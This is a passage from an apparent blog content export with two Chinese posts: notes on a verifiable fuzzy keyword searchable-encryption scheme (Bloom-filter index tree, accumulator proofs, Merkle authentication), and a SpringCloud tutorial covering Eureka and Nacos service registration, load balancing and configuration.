此外，在索引树的构建中，考虑文档分布对检索效率的影响，采用基于图的关键字划分算法来最小化左右索引子树中相同关键字的数量，以进一步提高检索效率。\n\n- ⓸为了进行正确性和完整性验证，首先使用 MSA 对未返回文档的不相交性和相应的查询关键字生成不匹配证明，以确保不丢失有效结果；然后通过MHT对索引树进行身份验证，以确保索引树中存储的内容不被篡改。\n\n  - 首先方案运行 $MSA.Acc$ 分别计算每个树节点和每个查询关键字的累积值\n\n  - 如果树节点不包含某个查询关键字，则方案运行 $MSA.PDisjoint$ 生成一个不匹配证明表示它们的不相交。\n\n  - 在不匹配证明的帮助下，QU 运行$MSA.VDisjoint$，验证未返回的文档是否确实不满足查询条件，以确保没有遗漏有效结果。\n\n  - 使用 MSA 来验证搜索结果的完整性的前提是索引树被完整地存储，没有被篡改，这是由 MHT 来保证的。\n  - 方案根据 MHT 对存储在每个树节点中的内容进行散列。 root digest 采用数字签名技术进行签名，以防止被篡改。\n\n  - 如果原始 root digest 等于基于辅助证明信息重新计算的 root digest，则索引树没有被篡改。这样，实现了对搜索结果的正确性和完整性的验证。\n\n## 4、具体实现\n\n### **❶KeyGen**\n\n> $KeyGen(1^λ, k)→ \\{PP, SK\\}$\n\n- ⓵DO首先运行 $MSA.KGen→\\{pk, sk\\}$，用于结果验证\n\n- ⓶再生成一对公私对 ${K_{pub}, K_{pri}}$ ，用于数字签名\n- ⓷再运行  $TBF.Setup$ 输出 $H_{key}$ 和 $H$\n- ⓸再生成一个键控哈希函数 $H_1 : \\{0,1\\}^∗× \\{0,1\\}^λ→ \\mathbb{Z}_p$\n- ⓹再随机生成传统的抗碰撞哈希 $H_2 : \\{0,1\\}^∗→ \\{0,1\\}^λ$\n\nDO 最终输出 $PP=\\{pk, K_{pub}, H, H_2\\},$ $SK=\\{sk,K_{pri},H_{key}, H_1\\}$\n\n### **❷IndexGen**\n\n> $IndexGen(F, N, PP, SK)→I$\n>\n\n从文档 $F = \\{f_1,···, f_m\\}$ 中采用 *Porter Stemming Algorithm* 提取关键词 $W=\\{w_1, w_2,···\\}$；DO 通过 $Algorithms \\ 1,2$ 生成经过身份验证的索引树\n\n| ![](https://img.jwt1399.top/img/202209281433785.png) | ![](https://img.jwt1399.top/img/202209281722510.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n| Fuzzy setting  & adaptive encryption                 | Index tree  &  Authenticatio©f                       |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202209261409397.png) | ![](https://img.jwt1399.top/img/202209261409241.png) |\n\n#### ⓵Fuzzy setting\n\n- 160 uni-gram vector $\\vec{v_j}$\n- LSH family： $ \\{h_{a_ι,b_ι}\\}^n_{ι=1}$\n  \n\n$$\nS_j=h_{a_1,b_1}(\\vec{v_j})||···||h_{a_n,b_n}(\\vec{v_j})\n$$\n\n------\n\n举个🌰：将单词 “secure” 放入 uni-gram 集合\n\n- 1.首先分片： $\\{s1，e1，c1，u1，r1，e2\\}$\n\n- 2.计算位置：$\\{19,5,3,21,18,26+5\\}$ \n\n- 3.设置值：对应位置设为1，其他位置设置为0，生成160维 uni-gram 集合\n\n- 4.映射到Bucket：使用 3 个 LSH $\\{h_{a_1,b_1}，h_{a_2,b_2}，h_{a_3,b_3}\\}$，将 $\\vec{v_j}$ 散列为 3 个哈希值，如 $s_1，s_2，s_3$，并生成 Bucket String $S=s_1||s_2||s_3$\n\n- 假设文档包含三个关键字，我们将相应的 3 个 Bucket String 映射到 TBF $B_i$\n\n<font color=\"#f0f\"><b>温馨提示</b></font>：uni-gram 向量的长度和 LSH 函数的数量可以根据 DO 的需要改变。\n\n------\n\n#### ⓶Adaptive encryption\n\n- DO 运行 $TBF.Initi$ 生成长度为 N 的 TBF $B_i$\n\n- 再运行 $TBF.Insert$ 将 Bucket String  $S_j$ 映射到 $B_i$\n  $$\n  B_i[h_1(S_j)],···, B_i[h_k(S_j)]\n  $$\n\n- 再生成 $tag$  $t_j=H_1(h_1(S_j)||···||h_k(S_j))$\n- $T_i $ 由 $f_i$ 所包含的关键字的所有标签组成，用于稍后生成累积值\n\n------\n\n#### ⓷Index tree construction\n\n为了实现亚线性检索，DO 将所有文档的 TBF 作为叶节点来构造平衡的二进制索引树，索引树中的每个非叶节点也是一个 n 维 TBF，由其子节点表示的所有关键字集的并集构造而成。\n\n- 设 $B_l$ 和 $B_r$ 是存储在节点 $L_f$ 的左右子节点中的两个 TBF ，存储在节点 $L_f$ 中的 TBF $B_f$ 构造如下：\n\n$$\nB_f = B_l ∨ B_r\n\\\\\\\\\nB_f[ι][H(h_{k+1}(ι)⊕γ_f)] =B_l[ι][H(h_{k+1}(ι)⊕γ_l)]∨B_r[ι][H(h_{k+1}(ι)⊕γ_r)]\n\\\\\\\\\\\nB_f[ι][1−H(h_{k+1}(ι)⊕γ_f)] = 1−B_f[ι][H(h_{k+1}(ι)⊕γ_f)]\n$$\n\n------\n\n#### ⓸Authentication\n\nDO使用 MSA 和 MHT 验证索引树，如下所示\n\n- 1.对于表示每个文档 $f_i$ 的叶节点，DO 生成一个累积值 $acc_i$ 和一个摘要 $d_i$\n\n$$\nacc_i=MSA.Acc(T_i, sk)\n\\\\\\\\\nd_i=H_2(c_i||B_i||acc_i)\n$$\n\n~~其中密文$c_i$是通过标准加密算法（如AES）加密文档而生成的~~\n\n- 2.对于每个非叶节点 $L_f$，DO 生成一个累积值  $acc_f$ 和一个摘要 $d_f$\n\n$$\nacc_f=MSA.Acc(T_f, sk)\n\\\\\\\\\nd_f=H_2(H_2(d_l||d_r)||B_f||acc_f)\n$$\n\n~~其中 $T_f$ 是其子节点 $tag$ 集的并集($T_f=T_l∪T_r$)。$d_l$，$d_r$ 是其左右子节点的摘要~~\n\n- 3.计算 root 摘要后，DO对其进行签名以获得 $Sig=sign_{K_{pri}}(d_{root})$\n\n------\n\n举个🌰：给定 5 个文档  $\\{f_1, f_2, f_3, f_4, f_5\\}$, 其中 $f_1=\\{w_1, w_3\\}$, $f_2=\\{w_1, w_5\\}$, $f_3=\\{w_1, w_3, w_5\\}$, $ f_4=\\{w_2, w_4\\}$, $f_5=\\{w_1, w_2, w_4\\}$\n\n- 1.首先将它们转换为 5 个 TBF，然后以 5 个TBF为叶节点构造平衡二叉索引树，实现亚线性检索。在使用 MSA 和 MHT 对其进行身份验证后\n- 每个非叶节点存储五个组件：$<B，P(T)，γ，acc，d>$\n  \n- 每个叶节点多存储一个组件：密文 c\n  \n- 根节点多存储一个组件：签名 Sig\n- 2.假设关键字 $w_1$ 的 Bucket String 散列到位置 1、2、3，其标签 $t_1=H_1(1||2||3)$类似地，$w_2、w_4、w_5$ 标签是计算 $t_2、t_4、t_5$\n- 3.将叶节点 $L_2$ 的累积值和摘要计算为 $acc_2=MSA.Acc({t_1，t_5}，sk)$ 和 $d_2=H_2(c_2||B_2||acc_2)$\n- 4.非叶节点 $L_6$ 的累积值和摘要计算为 $acc_6=MSA.Acc({t_1，t_2，t_4}，sk)$ 和 $d_6=H_2(H_2(d_4||d_5)||B_6||acc_6)$\n\n------\n\n### ❸TrapGen\n\n> $TrapGen(Q, SK)→ {TK, T_Q}$\n\n对于每个查询关键字 $w_i'∈Q$，QU 首先像 DO 在模糊设置步骤中一样将其转换为Bucket String $S_i'$，然后将 $S_i'$ 加密为 $tk_i$，并生成标签 $t_i'$ \n\n$$\ntk_i={(h_1(S_i'), h_{k+1}(h_1(S_i'))),···,(h_k(S_i'), h_{k+1}(h_k(S_i')))},\n\\\\\\\\\nt_i'=H_1(h_1(S_i')||···||h_k(S_i'))\n$$\n这样，QU 得到陷门 $TK = \\{tk_1，···，tk_q\\}$ 和标签集 $T_Q=\\{t_1'，···，t_q' \\}$，其中$q$ 为搜索查询 $Q$ 中包含的查询关键词的个数\n\n### ❹Search\n\n> $Search(I, TK, T_Q, PP)→ \\{R, AP\\}$\n\n![](https://img.jwt1399.top/img/202209282044990.png)\n\n收到搜索请求 $TK = \\{tk_1，···，tk_q\\}$ 后，CSP 从根节点检索经过身份验证的索引树 $I$，通过 $Algorithm \\ 3$ 查找包含所有查询关键字的叶节点\n\n- 从根节点开始，CSP 检查当前节点 node 是否包含所有查询关键字(第1-8行)\n\n- 如果 $node.B[h_ι(S_i')][H(h_{k+1}(h_ι(S_i'))⊕node.γ)] = 1$ 适用于 $∀ι ∈ [1,k]， i∈[1,q]$，则返回1，表示该节点包含所有查询关键字。\n- 然后，CSP 检查当前节点 node 是否是叶子节点。如果是，CSP将相应的密文 $c_i$ 添加到搜索结果集 $R$ (第10-11行)\n\n- 之后，CSP 添加元组 $⟨node.B, node.acc⟩$ 到辅助证明集 $AP$，并以相同的方式处理其左右子树(第12-14行)\n- 如果 $∃i∈[1, q], ι∈[1, k], node.B[h_ι(S_i')][H(h_{k+1}(h_ι(S_i'))⊕node.γ)] = 0$，它返回标签  $t_i'$ ，表示该 node 不包含查询关键字 $w_i'$。\n- 然后, CSP 运行$MSA.PDisjoint$ 为当前节点 node 和查询关键字 $w_i'$ 生成不匹配证明 $\\pi$，并添加元组 $⟨node.d, node.acc, t_i', π⟩$ 到 $AP$ (第16-17行)\n\n------\n\n🙋🏻‍♂️🌰：当查询为 $Q=\\{w_1，w_3\\}$ 时辅助证明集的示例\n\n- 在 5 个文档中，只有文档 $f_1、f_3$ 包含这两个关键字。\n\n- 因此，返回 $c_1、c_3$ 作为搜索结果\n- 辅助证明集 $AP$ 由搜索路径上各节点的 TBF $B_i$ 和累积值 $acc$、搜索路径外各节点的摘要 $d_i$ 、累积值 $acc$、不匹配标记 $t_i'$ 和不匹配证明 $\\pi$ 以及签名 Sig 组成。\n\n![](https://img.jwt1399.top/img/202209282044090.png)\n\n### ❺Verify\n\n> $Verify(R, AP, PP, SK)→1/0$\n\n使用辅助证明集 $AP$，验证者首先运行 $MSA.VDisjoint$ 检查搜索查询 $Q$ 是否确实与未返回的文档不匹配，然后重构最小认证树，并将其 $root$ 摘要与原始 $root$ 摘要进行比较，以验证搜索结果的正确性和完整性。\n\n在我们的例子中，验证者首先检查公式 14，以证明文档 $f_2, f_4, f_5$ 不包含查询关键字 $w_3$，这确实与搜索查询 $Q=\\{w_1, w_3\\}$ 不匹配。\n\n然后验证者使用对应的公钥对签名 $Sig$ 进行解密，得到原始根摘要 $d_{root}$，即 $d_{root}=ver_{K_{pub}}(Sig)$。最后，验证者重新计算公式15中的根摘要 $d_{root}'$，并将其与根进行比较。如果它们相等，则搜索结果是正确和完整的\n\n$$\nMSA.VDisjoint(acc_2,MSA.Acc(t_3, sk), π_2, sk) = 1\n\\\\\\\\\nMSA.VDisjoint(acc_6,MSA.Acc(t_3, sk), π_6, sk) = 1\n$$\n\n$$\nd_i'=H_2(c_i||B_i||acc_i), i= 1,3\n\\\\\\\\\nd_7'=H_2(H_2(d_3'||d_2)||B_7||acc_7)\n\\\\\\\\\nd_8'=H_2(H_2(d_7'||d_1')||B_8||acc_8)\n\\\\\\\\\nd_{root}'=H_2(H_2(d_8'||d_6)||B_{root}||acc_{root})\n$$\n\n\n\n\n\n\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["可搜索加密"],"categories":["Crypto"]},{"title":"SpringCloud-实用篇","url":"/posts/42622.html","content":"\n> 实用篇包含微服务治理(注册发现，远程调用，配置管理，网关路由)、Docker技术、异步通信、分布式缓存、分布式搜索\n\n小简从 0 开始学 Java 知识之 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《SpringCloud-实用篇》，不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计10天更新完\n- [x] 🎯开始时间：09-20\n- [x] 🎉结束时间：09-30\n- [x] 🍀总结：\n\n| ![学习安排](https://img.jwt1399.top/img/202209201412578.png) |\n| ------------------------------------------------------------ |\n| ![技术分类](https://img.jwt1399.top/img/202209201436751.png) |\n\n#  1.微服务\n\n## ①架构对比\n\n| `架构`     | `单体架构`                                             | `分布式架构`                                                 |\n| ---------- | ------------------------------------------------------ | ------------------------------------------------------------ |\n| **`描述`** | 将业务的所有功能集中在一个项目中开发，打成一个包部署。 | 根据业务功能对系统做拆分，每个业务功能模块作为独立项目开发。 |\n| **`图示`** | ![](https://img.jwt1399.top/img/202209201338897.png)   | ![](https://img.jwt1399.top/img/202209201338887.png)         |\n| **`优点`** | 架构简单、部署成本低                                   | 降低服务耦合、有利于服务升级和拓展                           |\n| **`缺点`** | 耦合度高（维护困难、升级困难）                         | 服务调用关系错综复杂                                         |\n\n分布式架构虽然降低了服务耦合，但是服务拆分时也有很多问题需要思考：\n\n- 服务拆分的粒度如何界定？\n- 服务集群地址如何维护？\n- 服务的调用关系如何管理？\n- 服务健康状态如何感知？\n\n人们需要制定一套行之有效的标准来约束分布式架构。因此微服务来啦！！！\n\n## ②微服务简介\n\n**微服务的架构特征：**\n\n- 单一职责：微服务拆分粒度更小，每一个服务都对应唯一的业务能力，做到单一职责\n- 自治：团队独立、技术独立、数据独立，独立部署和交付\n- 面向服务：服务提供统一标准的接口，与语言和技术无关\n- 隔离性强：服务调用做好隔离、容错、降级，避免出现级联问题\n\n微服务的上述特性其实是在给分布式架构制定一个标准，进一步降低服务之间的耦合度，提供服务的独立性和灵活性。做到高内聚，低耦合。因此**微服务**是一种经过良好架构设计的**分布式架构方案** 。\n\n\n\n![微服务架构](https://img.jwt1399.top/img/202209201355158.png)\n\n但方案该怎么落地？选用什么样的技术栈？其中在Java领域最引人注目的就是SpringCloud提供的方案了。\n\n## ③微服务方案\n\n目前国内使用最广泛的微服务方案：Dubbo、SpringCloud、SpringCloudAlibaba\n\n![方案对比](https://img.jwt1399.top/img/202209201416386.png)\n\n![](https://img.jwt1399.top/img/202209201419610.png)\n\n## ⑤案例引入\n\n> 下方的讲解都基于此案例进行，请提前搭建好此项目。[项目cloud-demo](https://jwt1399.lanzouv.com/b01dymdva) 密码:1399\n>\n> 搭建方式：1.使用IDEA 打开 cloud-demo项目 2.创建两个数据库`cloud_order`和`cloud_user `3.将提供的`cloud-order.sql`和`cloud-user.sql`导入对应库中 4.修改项目中数据库密码\n\n**项目结构：**\n\n```bash\ncloud-demo  # 父工程，管理依赖\n├── order-service # 订单微服务，负责订单相关业务\n└── user-service  # 用户微服务，负责用户相关业务\n```\n\n**项目特征：**\n\n- 订单微服务和用户微服务有各自的数据库，相互独立\n- 订单服务和用户服务都对外暴露Restful的接口\n- 订单服务如果需要查询用户信息，只能调用用户服务的Restful接口，不能查询用户数据库\n\n**基础概念：**\n\n在服务调用关系中，会有两个不同的角色：\n\n- **服务提供者**：一次业务中，被其它微服务调用的服务。（提供接口给其它微服务）\n\n- **服务消费者**：一次业务中，调用其它微服务的服务。（调用其它微服务提供的接口）\n\n- 服务提供者与服务消费者的角色并不是绝对的，而是相对于业务而言。\n\n![](https://img.jwt1399.top/img/202209202043982.png)\n\n**目前需求：**修改order-service中的查询订单业务，要求在查询订单的同时，根据订单中包含的userId查询出用户信息，一起返回。\n\n![](https://img.jwt1399.top/img/202209202020487.png)\n\n# 2.服务远程调用①\n\n## ①RestTemplate\n\n要实现上方需求，我们需要在order-service中向user-service发起一个http的请求，调用`http://localhost:8081/user/{userId}`接口。\n\n步骤如下：\n\n- 注册一个RestTemplate的实例到Spring容器\n- 修改order-service服务中的OrderService类中的queryOrderById方法，根据Order对象中的userId查询User\n- 将查询的User填充到Order对象，一起返回\n\n**步骤一：注册RestTemplate**\n\n```java\n@MapperScan(\"cn.xxxx.order.mapper\")\n@SpringBootApplication\npublic class OrderApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(OrderApplication.class, args);\n    }\n\n    @Bean\n    public RestTemplate restTemplate() {\n        return new RestTemplate();\n    }\n}\n```\n\n**步骤二：实现远程调用**\n\n```java\n@Service\npublic class OrderService {\n\n    @Autowired\n    private OrderMapper orderMapper;\n  \n    @Autowired\n    private RestTemplate restTemplate \n\n    public Order queryOrderById(Long orderId) {\n        // 1.查询订单\n        Order order = orderMapper.findById(orderId);\n        // 2.远程查询user\n        // 2.1 url地址\n        String url = \"http://localhost:8081/user/\" + order.getUserId();\n        // 2.2 发起调用\n        User user = restTemplate.getForObject(url, User.class);\n        // 3.存入order\n        order.setUser(user);\n        // 4.返回\n        return order;\n    }\n}\n```\n\n# 3.服务注册发现\n\n## ①Eureka\n\n> 假如我们的服务提供者user-service部署了多个实例，如图：\n>\n> <img src=\"https://img.jwt1399.top/img/202209202108940.png\" style=\"zoom: 25%;\" />\n>\n> 思考几个问题：\n>\n> - order-service在发起远程调用的时候，该如何得知user-service实例的ip地址和端口？\n> - 有多个user-service实例地址，order-service调用时该如何选择？\n> - order-service如何得知某个user-service实例是否依然健康，是不是已经宕机？\n\n### ❶Eureka原理分析\n\n这些问题都需要利用SpringCloud中的注册中心来解决，其中最广为人知的注册中心就是Eureka，其结构如下：\n\n![](https://img.jwt1399.top/img/202209202112546.png)\n\n问题1：order-service如何得知user-service实例地址？\n\n- user-service服务实例启动后，将自己的信息注册到eureka-server（Eureka服务端）。这个叫服务注册\n- eureka-server保存服务名称到服务实例地址列表的映射关系\n- order-service根据服务名称，拉取实例地址列表。这个叫服务发现或服务拉取\n\n问题2：order-service如何从多个user-service实例中选择具体的实例？\n\n- order-service从实例列表中利用负载均衡算法选中一个实例地址\n- 并向该实例地址发起远程调用\n\n问题3：order-service如何得知某个user-service实例是否依然健康，是不是已经宕机？\n\n- user-service会每隔一段时间（默认30秒）向eureka-server发起请求，报告自己状态，称为心跳\n- 当超过一定时间没有发送心跳时，eureka-server会认为微服务实例故障，将该实例从服务列表中剔除\n- order-service拉取服务时，就能将故障实例排除了\n\n![使用步骤](https://img.jwt1399.top/img/202209202118474.png)\n\n### ❷搭建eureka-server\n\n**步骤一：创建eureka-server模块**\n\n在cloud-demo父工程下，创建一个maven子模块 eureka-server\n\n**步骤二：引入eureka依赖**\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-eureka-server</artifactId>\n</dependency>\n```\n\n**步骤三：编写启动类**\n\n编写一个启动类，添加`@EnableEurekaServer`注解，开启eureka的注册中心功能\n\n```java\n@EnableEurekaServer\n@SpringBootApplication\npublic class EurekaApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(EurekaApplication.class, args);\n    }\n}\n```\n\n**步骤四：编写配置文件**\n\n```yaml\nserver:\n  port: 10086\nspring:\n  application:\n    name: eureka-server\neureka:\n  client:\n    service-url: \n      defaultZone: http://127.0.0.1:10086/eureka\n```\n\n**步骤五：启动服务**\n\n启动微服务，然后在浏览器访问：`http://127.0.0.1:10086`，看到Web页面表示成功了\n\n### ❸服务注册\n\n下面，我们将user-service注册到eureka-server中去。\n\n**步骤一：引入依赖**\n\n在user-service的pom文件中，引入`eureka-client`依赖：\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>\n</dependency>\n```\n\n**步骤二：配置文件**\n\n在user-service中，修改application.yml文件，添加服务名称、eureka地址：\n\n```yaml\nspring:\n  application:\n    name: userservice\neureka:\n  client:\n    service-url:\n      defaultZone: http://127.0.0.1:10086/eureka\n```\n\n**步骤三：启动多个user-service实例**\n\n为了演示一个服务有多个实例的场景，可以通过SpringBoot的启动配置，再启动一个user-service。\n\n| 1.复制原来的user-service启动配置：                   | 2.在弹出的窗口中，填写信息：                                 |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/202209211240292.png) | <img src=\"https://img.jwt1399.top/img/202209211241706.png\" style=\"zoom:50%;\" /> |\n| **3.出现两个user-service实例**                       | **4.启动两个user-service实例**                               |\n| ![](https://img.jwt1399.top/img/202209211241315.png) | ![](https://img.jwt1399.top/img/202209211241522.png)         |\n\n查看eureka-server管理页面：\n\n![](https://img.jwt1399.top/img/202209211241215.png)\n\n### ❹服务发现\n\n下面，我们将order-service的逻辑修改：实现向eureka-server拉取user-service的信息，即服务发现。\n\n**步骤一：引入依赖**\n\n服务发现、服务注册统一都封装在eureka-client依赖，因此这一步与服务注册时一致。\n\n在order-service的pom文件中，引入eureka-client依赖：\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>\n</dependency>\n```\n\n**步骤二：配置文件**\n\n服务发现也需要知道eureka地址，在order-service中，修改application.yml文件，添加服务名称、eureka地址：\n\n```yaml\nspring:\n  application:\n    name: orderservice\neureka:\n  client:\n    service-url:\n      defaultZone: http://127.0.0.1:10086/eureka\n```\n\n**步骤三：服务拉取和负载均衡**\n\n最后，我们要去eureka-server中拉取user-service服务的实例列表，并且实现负载均衡。\n\n在order-service的OrderApplication中，给RestTemplate这个Bean添加一个@LoadBalanced注解：\n\n```java\n@MapperScan(\"cn.xxxx.order.mapper\")\n@SpringBootApplication\npublic class OrderApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(OrderApplication.class, args);\n    }\n\n    @Bean\n    @LoadBalanced //添加注解\n    public RestTemplate restTemplate() {\n        return new RestTemplate();\n    }\n}\n```\n\n修改order-service服务中的OrderService类中的queryOrderById方法。修改访问的url路径，用服务名代替ip、端口：\n\n```java\n@Service\npublic class OrderService {\n\n    @Autowired\n    private OrderMapper orderMapper;\n  \n    @Autowired\n    private RestTemplate restTemplate \n\n    public Order queryOrderById(Long orderId) {\n        // 1.查询订单\n        Order order = orderMapper.findById(orderId);\n        // 2.远程查询user\n        // 2.1 url地址\n\t\t\t\t//String url = \"http://localhost:8081/user/\" + order.getUserId();\n        String url = \"http://userservice/user/\" + order.getUserId();\n        // 2.2 发起调用\n        User user = restTemplate.getForObject(url, User.class);\n        // 3.存入order\n        order.setUser(user);\n        // 4.返回\n        return order;\n    }\n}\n```\n\nspring会自动帮助我们从eureka-server端，根据userservice这个服务名称，获取实例列表，而后完成负载均衡。\n\n### ❺总结\n\n- 1.搭建EurekaServer\n\n  - 引入eureka-server依赖\n\n  - 添加@EnableEurekaServer注解\n  - 在application.yml中配置eureka地址\n\n- 2.服务注册\n  - 引入eureka-client依赖\n  - 在application.yml中配置eureka地址\n\n- 3.服务发现\n  - 引入eureka-client依赖\n  - 在application.yml中配置eureka地址\n  - 给RestTemplate添加@LoadBalanced注解\n  - 用服务提供者的服务名称远程调用\n\n##  ②Nacos\n\n> [Nacos](https://nacos.io/)是阿里巴巴的产品，是 SpringCloudAlibaba 中的一个组件。相比 Eureka 功能更加丰富，在国内受欢迎程度较高。\n\n### ❶安装\n\n下载地址：https://github.com/alibaba/nacos\n\n下载后解压即可，目录说明：\n\n```\n- log           nacos生成日志说明\n- bin           nacos服务相关脚本目录，\n- conf          nacos的配置文件目录\n- target        nacos的启动依赖目录\n- data          nacos自带apache-derby数据库，data存放数据内容\n```\n\n```bash\n# 启动命令 单体启动\nsh startup.sh -m standalone\n\n# 关闭命令\nsh shutdown.sh\n```\n\n在浏览器输入地址即可访问：`http://127.0.0.1:8848/nacos`，默认的账号和密码都是nacos\n\n如果你打不开这个网页 ！多半是版本问题。\n\n### ❷服务注册/发现\n\n**步骤一：引入依赖**\n\n在cloud-demo父工程的pom文件中的`<dependencyManagement>`中引入SpringCloudAlibaba的依赖：\n\n```xml\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-alibaba-dependencies</artifactId>\n    <version>2.2.6.RELEASE</version>\n    <type>pom</type>\n    <scope>import</scope>\n</dependency>\n```\n\n然后在user-service和order-service中的pom文件中引入nacos-discovery依赖：\n\n```xml\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n</dependency>\n```\n\n> **注意**：不要忘了注释掉eureka的依赖。\n\n**步骤二：配置nacos地址**\n\n在user-service和order-service的application.yml中添加nacos地址：\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n```\n\n> **注意**：不要忘了注释掉eureka的地址\n\n**步骤三：重启**\n\n重启微服务后，登录nacos管理页面，可以看到微服务信息\n\n![](https://img.jwt1399.top/img/202209211820247.png)\n\n### ❸集群配置\n\n#### ⓵分级存储模型\n\n一个**服务**可以有多个**实例**，例如我们的user-service，假如这些实例分布于全国各地的不同机房\n\n| 实例           | 机房 |\n| -------------- | ---- |\n| 127.0.0.1:8081 | 杭州 |\n| 127.0.0.1:8082 | 杭州 |\n| 127.0.0.1:8083 | 上海 |\n\nNacos就将同一机房内的实例划分为一个**集群**。也就是说，user-service是服务，一个服务可以包含多个集群，如杭州、上海、北京，每个集群下可以有多个实例，形成分级模型，如图：\n\n![](https://img.jwt1399.top/img/202209211844749.png)\n\n①一级是服务，例如user-service；②二级是集群，例如杭州或上海；③三级是实例，例如杭州机房的某台部署\n\n微服务互相访问时，应该尽可能访问同集群实例，因为本地访问速度更快。当本集群内实例不可用时，才访问其它集群。例如：杭州机房内的order-service应该优先访问同机房的user-service。\n\n![](https://img.jwt1399.top/img/202209211845713.png)\n\n#### ⓶给user-service配置集群\n\n修改`user-service`的application.yml文件，添加集群配置：\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n      discovery:\n        cluster-name: HZ # 集群名称\n```\n\n重启两个user-service实例后，我们可以在nacos控制台看到下面结果：\n\n![](../images/SpringCloud-实用篇/image-20220921185203122.png)\n\n我们再次复制一个user-service启动配置UserApplication3，复制方式参考【上方搭建eureka-server步骤三】\n\n添加VM属性：\n\n```sh\n-Dserver.port=8083 -Dspring.cloud.nacos.discovery.cluster-name=SH\n```\n\n启动UserApplication3后再次查看nacos控制台：\n\n![](https://img.jwt1399.top/img/202209211858088.png)\n\n#### ⓷同集群优先的负载均衡\n\n负载均衡默认规则`ZoneAvoidanceRule`并不能实现根据同集群优先来实现负载均衡。因此Nacos中提供了一个`NacosRule`的实现，可以优先从同集群中挑选实例。\n\n**步骤一：给order-service配置集群信息**\n\n修改`order-service`的application.yml文件，添加集群配置：\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n      discovery:\n        cluster-name: HZ # 集群名称\n```\n\n**步骤二：修改负载均衡规则**\n\n修改`order-service`的application.yml文件，修改负载均衡规则：\n\n```yaml\nuserservice:\n  ribbon:\n    NFLoadBalancerRuleClassName: com.alibaba.cloud.nacos.ribbon.NacosRule # 负载均衡规则 \n```\n\nNacosRule负载均衡策略\n\n- ①优先选择同集群服务实例列表\n\n- ②本地集群找不到提供者，才去其它集群寻找，并且会报警告\n\n- ③确定了可用实例列表后，再采用随机负载均衡挑选实例\n\n### ❹权重配置\n\n**实际部署中会出现这样的场景：**服务器设备性能有差异，部分实例所在机器性能较好，另一些较差，我们希望性能好的机器承担更多的用户请求。但默认情况下NacosRule是同集群内随机挑选，不会考虑机器的性能问题。\n\n因此，Nacos提供了权重配置来控制访问频率，权重越大则访问频率越高。在nacos控制台，找到user-service的实例列表，点击编辑，即可修改权重：\n\n| ![](https://img.jwt1399.top/img/202209211916270.png) | ![](https://img.jwt1399.top/img/202209211916058.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n> **注意**：如果权重修改为0，则该实例永远不会被访问，使用场景：进行实例的平滑更新\n\n### ❺环境隔离\n\nNacos提供了namespace来实现环境隔离功能。\n\n- nacos中可以有多个namespace\n- namespace下可以有group、service等\n- 不同namespace之间相互隔离，例如不同namespace的服务互相不可见\n\n**步骤一：创建namespace**\n\n默认情况下，所有service、group、data都在同一个namespace，名为public\n\n![](https://img.jwt1399.top/img/202209211923602.png)\n\n| 添加一个namespace                                    | 设置信息                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202209211922322.png) | ![](https://img.jwt1399.top/img/202209211922404.png) |\n\n就能在页面看到一个新的namespace：\n\n![](https://img.jwt1399.top/img/202209211923581.png)\n\n**步骤二：给微服务配置namespace**\n\n给微服务配置namespace只能通过修改配置来实现。例如，修改order-service的application.yml文件：\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      server-addr: localhost:8848\n      discovery:\n        cluster-name: HZ\n        namespace: 492a7d5d-237b-46a1-a99a-fa8e98e4b0f9 # 命名空间，填ID\n```\n\n重启order-service后，访问控制台，可以看到下面的结果：\n\n| ![](https://img.jwt1399.top/img/202209211924994.png) | ![](https://img.jwt1399.top/img/202209211924277.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n此时访问order-service，因为namespace不同，会导致找不到userservice，控制台会报错：\n\n![](https://img.jwt1399.top/img/202209211925591.png)\n\n## ③Nacos与Eureka区别\n\nNacos的服务实例分为两种类型：\n\n- 临时实例：    如果实例宕机超过一定时间，会从服务列表剔除，默认的实例类型。\n\n- 非临时实例：如果实例宕机，不会从服务列表剔除，也可以叫永久实例。\n\n配置一个服务实例为永久实例：\n\n```yaml\nspring:\n  cloud:\n    nacos:\n      discovery:\n        ephemeral: false # 设置为非临时实例\n```\n\nNacos和Eureka整体结构类似，服务注册、服务拉取、心跳等待，但是也存在一些差异：\n\n![](https://img.jwt1399.top/img/202209211928061.png)\n\n| 共同点                                                       | 不同点          